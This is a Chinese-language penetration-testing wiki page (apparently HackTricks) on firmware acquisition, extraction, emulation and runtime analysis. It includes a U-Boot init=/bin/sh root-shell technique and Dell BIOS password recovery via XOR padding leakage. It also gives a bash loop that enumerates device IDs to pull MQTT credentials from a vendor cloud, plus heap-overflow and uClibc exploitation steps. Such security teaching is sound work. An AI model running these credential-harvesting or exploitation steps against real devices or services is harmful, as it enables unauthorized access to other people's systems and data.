# 固件分析

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **简介**

### 相关资源

有关通过暴露的硬件接口获取固件，请参阅 [通过 UART 控制台辅助转储固件](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) 和 [转储 SPI flash](../hardware-hacking/spi.md#dumping-firmware-from-eeproms)。

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

固件是确保设备正常运行的关键软件，它负责管理并促进硬件组件与用户交互软件之间的通信。固件存储在永久性存储器中，确保设备从通电之时起便能访问重要指令，从而启动操作系统。检查固件并视情况对其进行修改，是识别安全漏洞的关键步骤。<sup>[[2]](#references)[[3]](#references)</sup>

## **信息收集**

**信息收集**是了解设备组成及其所用技术的关键初始步骤。此过程包括收集以下数据：

- CPU 架构及其运行的操作系统
- Bootloader 详情
- 硬件布局和数据手册
- 代码库指标和源代码位置
- 外部库及许可证类型
- 更新历史和法规认证
- 架构图和流程图
- 安全评估和已发现的漏洞

为此，**开源情报 (OSINT)** 工具非常有用；对任何可用的开源软件组件进行人工和自动化审查也同样重要。[Coverity Scan](https://scan.coverity.com) 和 [Semmle’s LGTM](https://lgtm.com/#explore) 等工具提供免费的静态分析，可用于查找潜在问题。

## **获取固件**

获取固件有多种方式，各自的复杂程度不尽相同：

- 从源头（开发者、制造商）**直接获取**
- 按照提供的说明**构建**
- 从官方支持网站**下载**
- 使用 **Google dork** 查询查找托管的固件文件
- 直接访问**云存储**，可使用 [S3Scanner](https://github.com/sa7mon/S3Scanner) 等工具
- 使用中间人技术拦截**更新**
- 通过 **UART**、**JTAG** 或 **PICit** 等连接从设备中**提取**
- 在设备通信中**嗅探**更新请求
- 查找并使用**硬编码的更新端点**
- 从 bootloader 或网络中**转储**
- 如果其他方法都行不通，则使用适当的硬件工具**拆下并读取**存储芯片

### 仅有 UART 日志：通过 flash 中的 U-Boot 环境变量强制启动 root shell

如果 UART RX 被忽略（只能查看日志），仍可通过离线**编辑 U-Boot 环境变量数据块**来强制启动 init shell：<sup>[[6]](#references)</sup>

1. 使用 SOIC-8 夹子和编程器（3.3V）转储 SPI flash：
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. 定位 U-Boot env 分区，编辑 `bootargs`，加入 `init=/bin/sh`，并为该 blob **重新计算 U-Boot env CRC32**。
3. 仅重新刷写 env 分区并重启；UART 上应该会出现 shell。

这对 bootloader shell 已禁用、但可通过外部 flash 访问写入 env 分区的嵌入式设备很有用。

## 分析固件

现在你**已经拿到固件**，需要提取相关信息，以便了解该如何处理它。可以使用以下不同工具：

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

如果使用这些工具没有发现太多内容，请使用 `binwalk -E <bin>` 检查镜像的**熵**；如果熵较低，则它不太可能经过加密。如果熵较高，则它很可能经过加密（或以某种方式压缩）。

此外，你可以使用这些工具提取**固件中嵌入的文件**：

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

或者使用 [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) 检查文件。

### 差分闪存分析与可恢复的 XOR 密钥存储

当某项固件设置没有公开记录的存储格式时，先对匹配的闪存进行多次读取，更改**恰好一项**设置，再次转储整个芯片并比较偏移量。使用受控值重复实验，可以将该设置与计数器和写入元数据区分开；如果变化出现在新偏移量而非原处，则表示存储采用追加写入或日志结构。请保留已删除或标记为墓碑的条目，因为其有效载荷字节可能仍可恢复。<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

定位该区域后，使用 `binwalk` 等工具提取固件模块，并在 Ghidra 中逆向分析写入器/验证器。在代码中确认字段边界、填充、密钥索引和密钥派生方式，而不是仅根据密文模式推断方案。<sup>[[12]](#references)</sup>

#### 从加密的零填充中恢复密钥

如 [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption) 中所述，已知明文可以揭示相同偏移处的密钥流字节。当重复 XOR 密钥的零填充覆盖了每个索引时，固定大小字段尤其容易受到攻击：加密后的填充会直接揭示这些密钥字节，因为 `0x00 XOR key_byte = key_byte`。如果覆盖了所有密钥索引，就可以从密文尾部重建密钥，并解密已填充的字节。<sup>[[12]](#references)</sup>

Dell 存在漏洞的 DVAR BIOS 密码格式就是一个具体示例：32 字节字段的第 `0` 字节是明文，而第 `1..31` 字节使用长度为 20 字节的重复密钥。<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

对于长度为 `L` 的密码，位置 `L..31` 在 XOR 前为零。当 `L <= 12` 时，这些位置覆盖了所有密钥索引，因此无需暴力破解即可恢复完整密钥和密码：<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### 从历史记录中提取密钥

不要单独分析每条记录。DVAR 密钥大致由 `modified_md5(device_seed || variable_GUID || password[0])` 派生：device seed 和 GUID 是固定的，唯一依赖密码的输入是明文首字节。每台设备最多对应 256 个密钥，因此首字节相同的记录会共用一个密钥。按首字节对有效记录和已删除记录分组；短历史记录可能通过填充泄露完整密钥，从而解密自身填充不足的当前较长记录。因此，密码轮换时若旧密文只是被标记为删除而非擦除，反而可能增加暴露风险。<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) 工具可定位 DVAR、验证候选记录、恢复密码，并显示原始存储字节/密钥字节。从代码仓库检出代码并构建后，可按以下方式扫描经过验证的闪存映像：<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

对于自定义解析器，可通过记录结构、可打印字符约束、零填充检查、密钥熵，以及密钥回绕时的一致性来排除误报。如果重复转储显示每次写入只有少量位发生翻转，请枚举观察到的掩码，并根据这些约束对修正结果排序；但应报告有歧义的字符，而不要将启发式结果说成精确恢复。<sup>[[12]](#references)</sup>

密码验证器应存储加盐、经过迭代的一次性哈希，而不是可逆密文；采用日志结构的存储应安全删除已被取代的机密材料。<sup>[[12]](#references)</sup>

### 获取文件系统

使用前面提到的工具（如 `binwalk -ev <bin>`）后，你应该已经能够**提取文件系统**。\
Binwalk 通常会将其提取到一个**以文件系统类型命名的文件夹**中，常见类型包括：squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs。

#### 手动提取文件系统

有时，binwalk 的签名中**没有文件系统的魔数**。在这种情况下，使用 binwalk **查找文件系统的偏移量，并从二进制文件中 carve 出压缩文件系统**，然后按照其类型使用以下步骤**手动提取**文件系统。

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

使用以下 **dd command** 提取 Squashfs 文件系统。

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

或者也可以运行以下命令。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- 对于 squashfs（如上例所用）

`$ unsquashfs dir.squashfs`

之后，文件将位于 "`squashfs-root`" 目录中。

- CPIO 归档文件

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- 对于 jffs2 文件系统

`$ jefferson rootfsfile.jffs2`

- 对于使用 NAND flash 的 ubifs 文件系统

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### 重建拆分的嵌入式根文件系统

如果原始 eMMC/SSD 转储包含有效的文件系统头，但其元数据偏移超出了标称分区的范围，不要立即将其判定为损坏。嵌入式引导代码可以通过 Device Mapper 将多个物理范围组合成实际的根设备，因此，从单个 GPT 分区中提取的数据只会包含第一个片段。<sup>[[9]](#references)</sup>

#### 对完整介质映像进行初步检查

首先确认采集已完成、映像大小稳定，且没有写入程序仍在占用该映像。如果文件名中编码了起始/结束地址，请将该范围与实际字节数进行比较。以只读模式恢复 GPT，并仅挂载所需范围；不要在工作站上对不可信的物理卷运行 `vgchange -ay`，因为这可能导致卷组冲突和意外写入。<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

如果原始 init 逻辑或 LVM stack 必须读取完整镜像，优先使用一次性 VM。标准启动分区中的历史启动日志尤其有用：bootloader 可能记录了 proprietary-container 偏移量、组件长度、slot 选择、对齐规则和签名验证信息。使用这些值提取嵌入的命令行、kernel 和 initramfs，然后分别使用 `file`、magic bytes 和 `binwalk` 验证每个输出；读取到容器末尾可能会意外地将 initrd、ACPI object 或签名附加到 kernel 后面。<sup>[[9]](#references)</sup>

#### 恢复启动时的块映射

提取 kernel 的 initramfs，并对其中的 `/init` 和任何存储库进行逆向分析。在 [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) 中，跟踪 `/proc/cmdline`、`/dev/mapper/`、`dmsetup`、`BLKGETSIZE64` 和分区路径的字符串引用；然后追踪选择活动 A/B slot 并构建映射表的代码。radare2 的实用起点包括 `r2 -A init`、`afl`、`pdf @ main` 和 `pdf @ fcn.xxxxx`。<sup>[[9]](#references)</sup>

linear target 会将虚拟设备的连续范围映射到一个或多个后端设备的范围。恢复出的双段映射表通常具有以下形式（所有位置和长度的单位均为 512 字节扇区）：<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

精确保留机器码中的算术运算，包括整数宽度、移位和单位换算。例如，以下表达式会先将字节大小向下取整到 4-KiB 边界，然后才转换为 512 字节扇区；若将其替换为 `p4_bytes // 512`，那么只要分区未按页对齐，所选尾部就会偏移 `p4_bytes % 4096`。<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

通过按表格顺序复制各个范围，并使用有界数据块，而不是将完整媒体转储加载到内存中，来重建平面分析映像。这样也能避免创建主机端 mapper 设备。将 GPT 推导出的偏移量、反向计算的扇区数以及最终输出长度分别作为独立断言保留。<sup>[[9]](#references)</sup>

#### 区分损坏与固定的重建错误

对于 SquashFS，在运行 `unsquashfs` 之前，检查 `hsqs` magic，并解码超级块偏移 40 处的小端 64 位 `bytes_used` 字段。如果提取在多个互不相关的结构中都失败，请在预期位置周围搜索较大的窗口，并要求候选项具备强结构特征：可解压的元数据块、多个连续有效的目录条目、合理的 inode 字段、与 inode 数量一致的根 inode，或有效的完整性元数据结构。单个 magic 匹配并不足够。<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

当相同的 signed delta 能让彼此独立的结构变得有效时——例如目录元数据和 verity 记录——可能的原因是系统性的段起始位置错误，而不是缺少字节。回到反向计算，检查是否丢弃了余数、是否存在 signedness 或溢出问题，或是否进行了扇区/页面舍入，然后再尝试恢复孤立数据或修补文件系统元数据。<sup>[[9]](#references)</sup>

最后，保护边界应分别看待：TPM-sealed LUKS 卷保护数据机密性，而 signed dm-verity 映射保护根文件系统完整性。软件 TPM 无法恢复绑定到原始物理 TPM 的密钥；通过省略 verity 验证的仅用于研究的 init 启动经过修改的 SquashFS，也不会伪造其签名或绕过 dm-verity。<sup>[[9]](#references)</sup>

## 分析固件

获取固件后，必须对其进行剖析，以了解其结构和潜在漏洞。此过程需要使用各种工具来分析固件映像并提取有价值的数据。

### 初步分析工具

下面提供了一组用于初步检查二进制文件（记作 `<bin>`）的命令。这些命令有助于识别文件类型、提取字符串、分析二进制数据，以及了解分区和文件系统详情：

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

要评估镜像的加密状态，可以使用 `binwalk -E <bin>` 检查其**熵**。熵较低通常表示未加密，而熵较高则可能表示已加密或经过压缩。

要提取**嵌入文件**，建议使用 **file-data-carving-recovery-tools** 文档和用于检查文件的 **binvis.io** 等工具和资源。

### 提取文件系统

使用 `binwalk -ev <bin>` 通常可以提取文件系统，提取结果通常位于以文件系统类型命名的目录中（例如 squashfs、ubifs）。但是，如果 **binwalk** 因缺少 magic bytes 而无法识别文件系统类型，则需要手动提取。具体做法是使用 `binwalk` 定位文件系统的偏移量，然后使用 `dd` 命令 carve 出文件系统：

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

之后，根据文件系统类型（例如 squashfs、cpio、jffs2、ubifs），使用不同的命令手动提取内容。

### 文件系统分析

提取文件系统后，便可开始搜索安全漏洞。重点关注不安全的网络守护进程、硬编码凭据、API 端点、更新服务器功能、未编译的代码、启动脚本，以及用于离线分析的编译二进制文件。

需要检查的**关键位置**和**项目**包括：

- **etc/shadow** 和 **etc/passwd** 中的用户凭据
- **etc/ssl** 中的 SSL 证书和密钥
- 可能存在漏洞的配置文件和脚本文件
- 用于进一步分析的嵌入式二进制文件
- 常见 IoT 设备的 Web 服务器和二进制文件

一些工具可帮助发现文件系统中的敏感信息和漏洞：

- 使用 [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 和 [**Firmwalker**](https://github.com/craigz28/firmwalker) 搜索敏感信息
- 使用 [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) 进行全面的固件分析
- 使用 [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) 和 [**EMBA**](https://github.com/e-m-b-a/emba) 进行静态和动态分析

### 编译二进制文件的安全检查

必须仔细审查文件系统中发现的源代码和编译二进制文件，以查找漏洞。**checksec.sh** 等工具用于检查 Unix 二进制文件，**PESecurity** 则用于检查 Windows 二进制文件，可帮助识别可能遭到利用的未受保护二进制文件。

## 通过派生的 URL token 获取云配置和 MQTT 凭据

许多 IoT 集线器会从类似以下形式的云端端点获取每台设备的配置：<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

在固件分析期间，你可能会发现 `<token>` 是使用硬编码密钥，根据设备 ID 在本地派生的，例如：

- token = MD5( deviceId || STATIC_KEY )，并以大写十六进制表示

这种设计使任何获知 deviceId 和 STATIC_KEY 的人都能重建 URL 并获取云配置，其中通常会暴露明文 MQTT 凭据和 topic 前缀。

实用流程：

1) 从 UART 启动日志中提取 deviceId

- 连接 3.3V UART 适配器（TX/RX/GND）并捕获日志：

```bash
picocom -b 115200 /dev/ttyUSB0
```

- 查找打印云配置 URL 模式和 broker 地址的行，例如：

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) 从 firmware 中恢复 STATIC_KEY 和 token 算法

- 将二进制文件加载到 Ghidra/radare2，并搜索 config 路径（"/pf/"）或 MD5 用法。
- 确认算法（例如，MD5(deviceId||STATIC_KEY)）。
- 在 Bash 中生成 token，并将摘要转换为大写：

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) 收集云端配置和 MQTT 凭据

- 构造 URL 并使用 curl 拉取 JSON；用 jq 解析并提取密钥：

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) 滥用明文 MQTT 和薄弱的 topic ACL（如果存在）

- 使用恢复的凭据订阅维护主题，并查找敏感事件：

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) 枚举可预测的设备 ID（经授权后批量操作）

- 许多生态系统会将厂商 OUI/产品/类型字节与顺序递增的后缀组合起来。
- 你可以遍历候选 ID，以编程方式派生 token 并获取配置：

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

注意事项
- 尝试大规模枚举前，务必获得明确授权。
- 尽可能优先使用模拟或静态分析来恢复秘密，避免修改目标硬件。


模拟固件的过程可以对设备的运行或单个程序进行**动态分析**。这种方法可能会遇到硬件或架构依赖方面的挑战，但将根文件系统或特定二进制文件传输到架构和字节序匹配的设备（例如 Raspberry Pi）或预先构建的虚拟机，可以便于进一步测试。

### 模拟单个二进制文件

要检查单个程序，确定程序的字节序和 CPU 架构至关重要。

#### MIPS 架构示例

要模拟 MIPS 架构的二进制文件，可以使用以下命令：

```bash
file ./squashfs-root/bin/busybox
```

并安装必要的仿真工具：

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

对于 MIPS（大端序），使用 `qemu-mips`；对于小端序二进制文件，则使用 `qemu-mipsel`。

#### ARM 架构仿真

对于 ARM 二进制文件，过程类似，使用 `qemu-arm` 模拟器进行仿真。

### 全系统仿真

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) 等工具可实现完整固件仿真，自动化处理流程并辅助动态分析。

### 为仿真重建拆分并经过验证的根文件系统

如果 SquashFS 超级块可读，但 inode、目录或片段表的偏移不合理，请不要立即修改 `unsquashfs`。应逆向分析早期启动二进制文件，并复现它创建的块设备关系图：嵌入式系统可能会显示一个名义上的根分区，但实际文件系统是通过 `dm-linear` 映射构建的，并将从另一个分区借来的扇区追加到其中。即使后续所有元数据块都发生偏移，仅检查超级块也可能成功。<sup>[[11]](#references)</sup>

应准确保留固件中的算术运算。特别要确认长度的单位是字节、512 字节扇区还是 4 KiB 页；按照原始顺序复现移位和截断；并考虑 A/B 布局中依赖存储区的尾部区域。例如，`(partition_bytes >> 12) << 3` 会先截断到 4 KiB 边界，然后再换算为 512 字节扇区；若将其替换为 `partition_bytes // 512`，追加区域可能会偏移几 KB，导致所有下游 SquashFS 表损坏。<sup>[[11]](#references)</sup>

一种实用的验证流程如下：<sup>[[11]](#references)</sup>

1. 从 verifier/init 二进制文件中还原每个 `dm-linear` 段的源设备、起始扇区和长度。
2. 拼接或映射这些区段，同时保留其对齐语义。
3. 如果提取仍然失败，只在预测边界附近的小范围内搜索，并要求连续出现多个有效元数据结构，而不要仅凭一个看似合理的超级块就判定成功。
4. 使用未经修改的 `unsquashfs` 检查重建的映像；成功遍历所有目录和片段，比 `unsquashfs -stat` 更能证明映像有效。

#### 由分析人员控制的 dm-verity 替换

当分析人员控制 QEMU 内核、initramfs 和虚拟磁盘时，可以用一个小型静态链接 init 替换厂商的验证 PID 1，从而启动修改后的根文件系统。这属于**实验室启动链替换**，并不意味着攻破了 dm-verity、其 RSA 签名、Secure Boot 或由 TPM 封装的密钥。<sup>[[11]](#references)</sup>

替代 init 应复现原始启动流程中的关键操作：挂载 `devtmpfs`、调用 `setsid()`、将 `/dev/console` 连接到文件描述符 0–2、挂载 `/proc` 和 `/sys`、等待提供的块设备、以只读方式挂载修改后的根文件系统、卸载旧根文件系统的伪文件系统、将新挂载点移动到 `/`、执行 `chroot`，然后 `execve()` 固件原始的 `/sbin/init`。在 `MS_MOVE` **之前**卸载 `/dev`、`/proc` 和 `/sys`，可以避免意外卸载属于新根文件系统的挂载点。<sup>[[11]](#references)</sup>

应将可变设备状态与修改后的只读根文件系统分开。qcow2 overlay 可以保留原始磁盘的 LVM 状态，同时使用第二块只读 virtio 磁盘提供修改后的 SquashFS：<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### 离线镜像状态调试

如果启动缓慢、具有破坏性的启动脚本或不可靠的控制台日志掩盖了故障，请检查 guest 外部的持久化状态。切勿挂载正在被运行中的 VM 使用的 overlay；使用 `qemu-nbd` 将其暴露出来，将 LVM 发现范围限制为目标 NBD 分区，并在断开连接前停用卷组。<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

为了可重复地隔离故障，将带时间戳的标记文件写入稳定的可写卷，并在离线状态下验证；`/dev/kmsg`、FIFO 和临时控制台可能因速率限制或进程过早退出而产生假阴性。此外，在修改无关代码之前，先比较各层的确切接口：`uname -r` 与 `/lib/modules/`、磁盘上的 ext4 特性与内核配置，以及 Mesa `libGL` 的版本与 DRI 驱动 ABI 和根据 PCI 信息得出的驱动名称。某个组件可能存在，甚至能够成功执行 `dlopen()`，但仍然无法使用，因为它的使用方期望的是不同的 ABI。<sup>[[11]](#references)</sup>

## 实践中的动态分析

在此阶段，使用真实或模拟的设备环境进行分析。必须保持对操作系统和文件系统的 shell 访问。模拟可能无法完美复现硬件交互，因此有时需要重启模拟环境。分析应重新检查文件系统，利用暴露的网页和网络服务，并探查 bootloader 漏洞。固件完整性测试对于发现潜在的 backdoor 漏洞至关重要。

## 运行时分析技术

运行时分析是在进程或二进制文件所处的运行环境中与其交互，并使用 gdb-multiarch、Frida 和 Ghidra 等工具设置断点，通过 fuzzing 和其他技术识别漏洞。

对于没有完整调试器的嵌入式目标，**将静态链接的 `gdbserver` 复制到设备上，并进行远程连接**：<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor 消息映射

在 IoT hub 上，RF stack 通常由 **radio MCU** 和 Linux userland process 分担。一个实用的工作流程是映射以下路径：<sup>[[8]](#references)</sup>

1. 空中的 **RF frame**
2. radio MCU 上的 **controller-side parser**
3. 转发到 Linux 的 **serial/UART text 或 TLV protocol**（例如 `/dev/tty*`）
4. 主 daemon 中的 **application dispatcher**
5. **protocol-specific handler / state machine**

这种架构会产生两个逆向目标，而不是一个。如果 controller 将二进制 radio frame 转换为文本协议，例如 `Group,Command,arg1,arg2,...`，则需要还原：

- **message groups** 和 dispatch tables
- 哪些消息可以来自 **network**，哪些只能来自 controller 本身
- 精确的 **manufacturer-specific discriminator fields**（例如 Zigbee `manufacturer_code` 和自定义 `cluster_command`）
- 哪些 handler 只能在 **commissioning**、discovery 或 firmware/model download 阶段访问

对于 Zigbee，捕获配对流量，并检查目标是否仍使用默认的 **Link Key** `ZigBeeAlliance09`。如果是，嗅探 commissioning 流量可能会暴露 **Network Key**。Zigbee 3.0 install codes 可以降低这种风险，因此请确认被测设备是否确实强制使用它们。

### Manufacturer-specific protocol handlers 和 FSM 控制的可达性

Vendor-specific Zigbee/ZCL 命令通常比标准化 clusters 更值得关注，因为它们会进入 **custom parsing code** 和内部 **FSMs**，这些代码的验证往往未经充分测试。<sup>[[8]](#references)</sup>

实用工作流程：

- 逆向 command dispatcher，直到找到 **vendor-only handler**。
- 还原 **FSM state**、**event**、**check**、**action** 和 **next-state** tables。
- 找出会自动前进的 **transitional states**，以及最终会重置或释放攻击者可控状态的 retry/error 分支。
- 确认需要哪些合法的 protocol exchanges 才能让 daemon 进入有漏洞的状态，不要假设有问题的 handler 始终可达。

对于对时序敏感的协议，使用 Python framework 重放 packet 可能太慢。更可靠的方法是使用真实硬件（例如 **nRF52840**）模拟合法设备，并使用厂商级 stack，以便正确暴露 **endpoints**、**attributes** 和 commissioning 时序。

### Embedded daemon 中的分片下载漏洞类型

**fragmented blob/model/configuration downloads** 中反复出现一类 firmware 漏洞：<sup>[[8]](#references)</sup>

1. **第一个 fragment**（`offset == 0`）存储 `ctx->total_size` 并分配 `malloc(total_size)`。
2. 后续 fragments 只验证攻击者可控的 **packet-local** 字段，例如 `packet_total_size >= offset + chunk_len`。
3. 执行复制时使用 `memcpy(&ctx->buffer[offset], chunk, chunk_len)`，却不检查数据是否超出**最初分配的大小**。

攻击者可以：

- 发送一个声明总大小**较小**的有效首个 fragment，强制进行小型 heap allocation。
- 之后发送一个具有**预期 offset**、但 `chunk_len` 更大的 fragment。
- 伪造满足新检查条件的 packet-local size，同时仍溢出最初分配的 buffer。

如果有漏洞的路径受 commissioning logic 控制，利用时必须进行足够的 **device emulation**，让目标进入预期的 model-download 或 blob-download 状态，然后再发送格式错误的 fragments。

### 由协议触发的 `free()`

在 embedded daemon 中，触发 heap metadata exploitation 最简单的方法通常不是“等待清理”，而是**触发协议自身的错误处理逻辑**：<sup>[[8]](#references)</sup>

- 发送格式错误的后续 fragments，让 FSM 进入 **retry** 或 **error** 状态。
- 超过 retry 阈值，让 daemon **重置 context** 并释放被破坏的 buffer。
- 利用这个可预测的 `free()` 触发 allocator-side primitives，避免进程因其他原因先行崩溃。

这对于 embedded Linux 中基于 **musl/uClibc/dlmalloc** 的 allocators 特别有用，因为破坏 chunk metadata 可以将 unlink/unbin logic 转化为 write primitive。一种稳定的做法是破坏 **size field**，将 allocator traversal 引导至溢出 buffer 内预先布置的 **fake chunks**，而不是立即覆盖真实的 bin pointers 并导致进程崩溃。

## Binary Exploitation 和 Proof-of-Concept

为已识别的漏洞开发 PoC，需要深入理解目标架构，并使用较低级语言编程。Embedded systems 中的 binary runtime protections 并不常见，但如果存在，可能需要使用 Return Oriented Programming (ROP) 等技术。

### uClibc fastbin exploitation 注意事项（embedded Linux）

- **Fastbins + consolidation：**uClibc 使用类似 glibc 的 fastbins。之后的大型 allocation 可能会触发 `__malloc_consolidate()`，因此任何 fake chunk 都必须通过检查（size 合理、`fd = 0`，且周围的 chunks 被视为“in use”）。<sup>[[6]](#references)</sup>
- **ASLR 下的 non-PIE binaries：**如果启用了 ASLR，但主 binary 是 **non-PIE**，则 binary 内的 `.data/.bss` 地址保持稳定。可以瞄准一个已经类似有效 heap chunk header 的区域，使 fastbin allocation 落到 **function pointer table** 上。
- **使 parser 停止的 NUL：**解析 JSON 时，payload 中的 `\x00` 可以停止解析，同时保留后续由攻击者控制、用于 stack pivot/ROP chain 的字节。
- **通过 `/proc/self/mem` 执行 shellcode：**调用 `open("/proc/self/mem")`、`lseek()` 和 `write()` 的 ROP chain，可以将可执行 shellcode 写入已知 mapping 并跳转到该处。

## 用于 Firmware Analysis 的预配置操作系统

[AttifyOS](https://github.com/adi0x90/attifyos) 和 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 等操作系统提供预配置环境，用于 firmware security testing，并配备所需工具。

## 用于分析 Firmware 的预配置 OS

- [**AttifyOS**](https://github.com/adi0x90/attifyos)：AttifyOS 是一个旨在帮助你对 Internet of Things (IoT) 设备进行安全评估和 penetration testing 的发行版。它提供预配置环境并加载所有必要工具，能为你节省大量时间。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS)：基于 Ubuntu 18.04 的 embedded security testing 操作系统，预装了 firmware security testing 工具。

## Firmware Downgrade Attacks 和不安全的 Update Mechanisms

